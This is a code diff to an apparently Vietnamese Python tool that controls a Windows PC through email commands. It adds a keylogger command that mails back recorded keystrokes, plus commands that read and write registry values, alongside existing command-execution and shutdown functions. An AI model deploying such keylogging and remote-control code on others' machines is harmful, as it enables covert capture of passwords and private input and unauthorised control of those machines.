@@ -1,8 +1,8 @@
-import os
 from PIL import ImageGrab
 from mail import *
 from textwrap import dedent
 from utils import *
+import os, keyboard, time
 
 def SHUTDOWN(req):
     res = create_mail(
@@ -100,7 +100,41 @@ def RUN_COMMAND(req):
     return res
 RUN_COMMAND.__doc__ = 'RUN_COMMAND <command>: chạy lệnh <command>'
 
+def CATCH_KEYPRESS(req):
+    duration = req['Subject'].split()[-1]
+    duration = int(duration)
+    key_pressed = keyboard.start_recording()
+    time.sleep(duration)
+    keyboard.stop_recording()
+    key_pressed = list(key_pressed[0].queue)
+    content = ''
+    for key in key_pressed:
+        content += key.name + ' ' + key.event_type + '\n'
+    res = create_mail(
+        plain_content='Keyboard event from {} in {} second\n\n{}'.format(time_in_format(), duration, content),
+        original=req
+    )
+    return res
+CATCH_KEYPRESS.__doc__ = 'CATCH_KEYPRESS <duration>: bắt phím nhấm trong khoảng thời gian <duration> (giây)'
 
+def SET_REGISTRY(req):
+    reg_path, name, value = req['Subject'].split()[2:]
+    content = set_registry(reg_path, name, value)
+    res = create_mail(
+        plain_content='Registry {} is set at {}\n\n{}'.format(reg_path, time_in_format(), content),
+        original=req
+    )
+    return res
+SET_REGISTRY.__doc__ = 'SET_REGISTRY <reg_path> <name> <value>: cập nhật giá trị <value> cho registry <name> trong <reg_path>'
+def GET_REGISTRY(req):
+    reg_path, name = req['Subject'].split()[2:]
+    content = get_registry(reg_path, name)
+    res = create_mail(
+        plain_content='Registry {} is get at {}\n\n{}'.format(reg_path, time_in_format(), content),
+        original=req
+    )
+    return res
+GET_REGISTRY.__doc__ = 'GET_REGISTRY <reg_path> <name>: lấy giá trị của registry <name> trong <reg_path>'
 COMMANDS = []
 EXECUTE = {}
 USAGE = {}
@@ -110,7 +144,7 @@ for key, value in list(locals().items()):
             EXECUTE[key] = value
             USAGE[key] = value.__doc__
 
-def HELP(req):
+def HELP(req, isInvalid=False):
     content = '''
     !!! ỨNG DỤNG CHỈ SỬ DỤNG CHO HỆ ĐIỀU HÀNH WINDOWS !!!
     Đầu tiên, bạn cần phải khởi tạo key dành cho riêng bạn. Nó giống như password của bạn vậy.
@@ -127,6 +161,8 @@ def HELP(req):
     for command in COMMANDS:
         content += USAGE[command] + '\n'
     content += 'HELP: hiển thị danh sách các lệnh có thể dùng'
+    if isInvalid:
+        content = '!!! Câu lệnh không hợp lệ !!!\n\n' + content
     res = create_mail(
         plain_content=content,
         original=req
